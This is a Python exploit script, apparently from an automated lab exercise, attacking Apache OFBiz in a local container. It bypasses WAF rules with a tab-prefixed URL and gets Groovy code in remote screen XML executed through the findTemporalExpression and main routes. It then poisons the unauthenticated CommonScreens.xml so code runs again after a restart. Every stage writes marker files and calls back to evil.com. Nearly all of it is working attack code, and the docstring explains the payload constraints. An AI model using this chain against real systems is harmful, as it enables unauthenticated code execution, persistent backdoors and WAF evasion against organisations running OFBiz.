# -*- coding: utf-8 -*-
"""Final round - OFBiz deepen (Task 1b): persistence across restart.

Chain (all through WAF entry 18381 only):
  P1  known residual (%09 + findTemporalExpression) fetches joint_deep1.xml ->
      brace-free groovy performs minimal surgery on the UNAUTHENTICATED main
      screen in framework/webtools/widget/CommonScreens.xml, injecting one
      <set value="${groovy:...}"/> that stamps pwn_joint_persist + calls back
      to infra. Also stamps pwn_joint_deep1 + callback in the same run.
  P2  GET /webtools/control/main -> if ScreenFactory re-reads the widget file,
      poisoned actions execute already (lazy load).
  P3  docker restart ofbiz (writable layer keeps the poisoned file) -> first
      GET main re-stamps pwn_joint_persist with a fresh timestamp + infra hit:
      PERSISTENCE ACROSS RESTART, unauthenticated, no SSRF parameter involved.
  P4  sister-route probe: POST /webtools/control/main with mainDecoratorLocation
      (%09) -> route NOT covered by WAF rule 3006 (URI anchor list), only 3005's
      name family + the %09 residual -> third SSRF route outside 3006.

Outer-groovy constraints: the ${groovy: expander truncates at the first '}' ->
NO literal '}' anywhere (B=(char)125); the XML attribute is double-quoted and
must not hold raw '<' (=&lt;) or raw '&' (no && - nested braceless ifs instead).
Truth = container file mtimes + infra log; never HTTP status.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"
TARGET = "https://127.0.0.1:18381"
ROUTE_FIND = "/webtools/control/main/findTemporalExpression"
ROUTE_MAIN = "/webtools/control/main"
CB = "http://evil.com:8000/rt/"
XML_HEAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
    'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
    'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
)

OUTER = (
    "def f = new File('/usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml');"
    "def s = f.getText('UTF-8');"
    "def B = (char)125;"
    "def q = (char)39;"
    "def D = (char)34;"
    "def g = 'new File(' + q + '/usr/src/apache-ofbiz/pwn_joint_persist' + q + ').setText(' + q + 'persisted at ' + q + ' + new java.util.Date());new URL(' + q + '" + CB + "joint_ofbiz_persist1' + q + ').getText();';"
    "def setLine = '<set value=' + D + '${groovy:' + g + B + D + '/>';"
    "def anchor = '<set field=' + D + 'headerItem' + D + ' value=' + D + 'main' + D + '/>';"
    "def i1 = s.indexOf('<screen name=' + D + 'main' + D + '>');"
    "def i2 = s.indexOf(anchor, i1);"
    "if (!s.contains('pwn_joint_persist')) "
    "if (i1 >= 0) "
    "if (i2 > i1) "
    "f.setText(s.substring(0, i2 + anchor.length()) + setLine + s.substring(i2 + anchor.length()), 'UTF-8');"
    "new File('/usr/src/apache-ofbiz/pwn_joint_deep1').setText('deep write at ' + new java.util.Date());"
    "new URL('" + CB + "joint_ofbiz_deep1').getText();"
)
OUTER = OUTER.replace("<", "&lt;")

DEEP1_XML = (XML_HEAD +
             '    <screen name="TemporalExpressionDecorator">\n'
             '        <section>\n'
             '            <actions>\n'
             '                <set value="${groovy:' + OUTER + '}"/>\n'
             '            </actions>\n'
             '        </section>\n'
             '    </screen>\n'
             '</screens>\n')

SISTER_GROOVY = (
    "new File('/usr/src/apache-ofbiz/pwn_joint_sister1').setText('sister mainDecoratorLocation at ' "
    "+ new java.util.Date());new URL('" + CB + "joint_ofbiz_sister1').getText();"
)
SISTER_XML = (XML_HEAD +
              '    <screen name="main-decorator">\n'
              '        <section>\n'
              '            <actions>\n'
              '                <set value="${groovy:' + SISTER_GROOVY + '}"/>\n'
              '            </actions>\n'
              '        </section>\n'
              '    </screen>\n'
              '</screens>\n')


def write_payload(name, content):
    with open(WWW + "\\" + name, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(content)
    print("[payload] wrote", name, len(content), "bytes")


def sh(cmd, timeout=180):
    r = subprocess.run(cmd, capture_output=True, text=True, errors="replace", timeout=timeout)
    return (r.stdout or "") + (r.stderr or "")


def truth(label):
    print("--- truth:", label)
    out = sh(["docker", "exec", "multi-round-lab-ofbiz-1", "sh", "-c",
              "ls -l --full-time /usr/src/apache-ofbiz/pwn_joint_deep1 "
              "/usr/src/apache-ofbiz/pwn_joint_persist /usr/src/apache-ofbiz/pwn_joint_sister1 2>/dev/null; "
              "grep -c pwn_joint_persist /usr/src/apache-ofbiz/framework/webtools/widget/CommonScreens.xml 2>/dev/null"])
    print(out.strip() or "(no markers)")
    out = sh(["docker", "logs", "multi-round-lab-infra-1", "--since", "3m"])
    for line in out.splitlines():
        if "joint_ofbiz" in line:
            print("[infra]", line.strip())


def main():
    assert "}" not in OUTER.replace("&lt;", ""), "outer groovy must be brace-free"
    write_payload("joint_deep1.xml", DEEP1_XML)
    write_payload("joint_sister1.xml", SISTER_XML)

    s = requests.Session()
    s.trust_env = False
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0"

    print("\n=== P1: residual chain -> CommonScreens surgery ===")
    r = s.post(TARGET + ROUTE_FIND,
               data="tempExprDecoratorLocation=%09http://evil.com:8000/payloads/joint_deep1.xml",
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=90, allow_redirects=False)
    print("[*] P1 findTemporalExpression -> HTTP", r.status_code, len(r.content), "B")
    time.sleep(3)
    truth("after P1")

    print("\n=== P2: trigger poisoned main screen (lazy load, pre-restart) ===")
    r = s.get(TARGET + ROUTE_MAIN, timeout=90, allow_redirects=False)
    print("[*] P2 GET main -> HTTP", r.status_code, len(r.content), "B")
    time.sleep(2)
    truth("after P2")

    print("\n=== P3: restart ofbiz, re-trigger (persistence) ===")
    print("[*] docker restart ->", sh(["docker", "restart", "multi-round-lab-ofbiz-1"]).strip())
    deadline = time.time() + 420
    first = None
    while time.time() < deadline:
        try:
            probe = s.get(TARGET + ROUTE_MAIN, timeout=8, allow_redirects=False)
            if probe.status_code == 200:
                first = probe
                print("[*] boot probe -> HTTP 200 (OFBiz up)")
                break
            print("[*] boot probe -> HTTP %s (waiting)" % probe.status_code)
        except Exception:
            pass
        time.sleep(10)
    if first is None:
        print("[!] OFBiz did not come back within 7 minutes - record honestly")
        return
    time.sleep(3)
    truth("after P3 (first post-restart render)")

    print("\n=== P4: sister route mainDecoratorLocation on /webtools/control/main ===")
    r = s.post(TARGET + ROUTE_MAIN,
               data="mainDecoratorLocation=%09http://evil.com:8000/payloads/joint_sister1.xml",
               headers={"Content-Type": "application/x-www-form-urlencoded"},
               timeout=90, allow_redirects=False)
    print("[*] P4 POST main -> HTTP", r.status_code, len(r.content), "B")
    time.sleep(3)
    truth("after P4")


if __name__ == "__main__":
    main()
